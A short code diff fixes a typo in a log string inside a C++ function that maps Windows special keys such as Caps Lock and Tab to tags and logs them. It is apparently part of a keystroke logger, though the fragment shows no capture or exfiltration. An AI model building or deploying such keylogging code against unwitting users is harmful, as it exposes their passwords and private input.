@@ -50,7 +50,7 @@ bool SpecialKeys(int S_Key) {
 		return true;
 	case VK_CAPITAL:
 		cout << "#CAPS_LOCK#";
-		LOG("#CAPS_LCOK");
+		LOG("#CAPS_LOCK");
 		return true;
 	case VK_TAB:
 		cout << "#TAB";
